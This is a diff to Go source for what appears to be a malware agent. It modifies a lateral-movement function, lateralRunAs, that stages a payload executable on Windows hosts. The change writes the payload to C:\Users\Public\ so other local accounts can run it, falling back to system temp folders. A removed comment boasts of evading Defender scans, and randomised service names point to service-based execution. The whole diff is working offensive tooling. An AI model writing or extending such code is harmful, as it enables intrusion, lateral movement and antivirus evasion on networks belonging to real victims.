@@ -4,9 +4,11 @@ package agent
 
 import (
 	"fmt"
+	"io"
 	"net"
 	"os"
 	"os/exec"
+	"path/filepath"
 	"runtime"
 	"strings"
 	"syscall"
@@ -42,6 +44,21 @@ const (
 type svcStatus struct{ dwServiceType, dwCurrentState, dwControlsAccepted, dwWin32ExitCode, dwServiceSpecificExitCode, dwCheckPoint, dwWaitHint uint32 }
 
 // ── helpers ───────────────────────────────────────────���───────────────────────
+
+func copyFile(src, dst string) error {
+	in, err := os.Open(src)
+	if err != nil {
+		return err
+	}
+	defer in.Close()
+	out, err := os.OpenFile(dst, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0644)
+	if err != nil {
+		return err
+	}
+	defer out.Close()
+	_, err = io.Copy(out, in)
+	return err
+}
 
 // randSvcName returns a short random service name like "svc3f8a1b2c".
 func randSvcName() string {
@@ -561,16 +578,31 @@ func lateralRunAs(host string, data []byte, existingPath, svcName, user, pass st
 
 	var localPath string
 	if existingPath != "" {
-		// Reuse a file already on disk — no new write, Defender has nothing to scan.
-		localPath = existingPath
+		// Copy to C:\Users\Public\ so the target user can read it (user's own
+		// AppData\Local\Temp is not accessible to other local accounts).
+		base := filepath.Base(existingPath)
+		pubPath := `C:\Users\Public\` + base
+		if !strings.EqualFold(existingPath, pubPath) {
+			if err := copyFile(existingPath, pubPath); err == nil {
+				localPath = pubPath
+			}
+		}
+		if localPath == "" {
+			localPath = existingPath
+		}
 	} else {
 		// Stage payload directly (no SMB loopback issue)
 		exeName := svcName + ".exe"
-		localPath = `C:\Windows\Temp\` + exeName
-		if err := os.WriteFile(localPath, data, 0644); err != nil {
-			localPath = `C:\Windows\` + exeName
-			if err2 := os.WriteFile(localPath, data, 0644); err2 != nil {
-				return "", fmt.Errorf("runas: write payload: %w", err)
+		pubPath := `C:\Users\Public\` + exeName
+		if err := os.WriteFile(pubPath, data, 0644); err == nil {
+			localPath = pubPath
+		} else {
+			localPath = `C:\Windows\Temp\` + exeName
+			if err := os.WriteFile(localPath, data, 0644); err != nil {
+				localPath = `C:\Windows\` + exeName
+				if err2 := os.WriteFile(localPath, data, 0644); err2 != nil {
+					return "", fmt.Errorf("runas: write payload: %w", err)
+				}
 			}
 		}
 	}
